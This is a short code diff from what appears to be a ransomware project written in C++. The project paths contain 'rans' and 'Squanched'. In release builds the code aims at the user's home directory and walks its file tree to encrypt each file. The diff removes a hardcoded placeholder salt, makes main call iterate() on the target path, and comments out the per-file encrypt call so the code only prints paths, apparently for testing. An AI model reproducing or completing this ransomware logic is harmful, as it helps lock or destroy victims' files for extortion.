@@ -24,13 +24,6 @@
 using namespace boost::filesystem;
 using std::string;
 
-//TODO change this salt!
-static const BYTE Salt[] =
-{
-	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
-	0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
-};
-
 void encrypt(string path);
 
 void iterate(const path& parent);
@@ -46,12 +39,12 @@ int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 
 #ifdef DEBUG
-	string path = "c:\\rans\\236499\\Squanched\\Debug\\rans.txt";
+	string path = "c:\\rans\\236499\\Squanched\\Debug\\testDir";
 #else
 	string path = get_home();
 #endif
 
-	encrypt(path);
+	iterate(path);
 //	iterate(path);
 
 //#ifdef DEBUG
@@ -209,11 +202,8 @@ void iterate(const path& parent) {
 }
 
 void process(const path& path) {
-#ifdef debug
-	cout << "processing " << path << endl;
-#else
-	encrypt(path.string());
-#endif
+	std::cout << "processing " << path.string() << std::endl;
+	//encrypt(path.string());
 }
 
 //string get_username() {
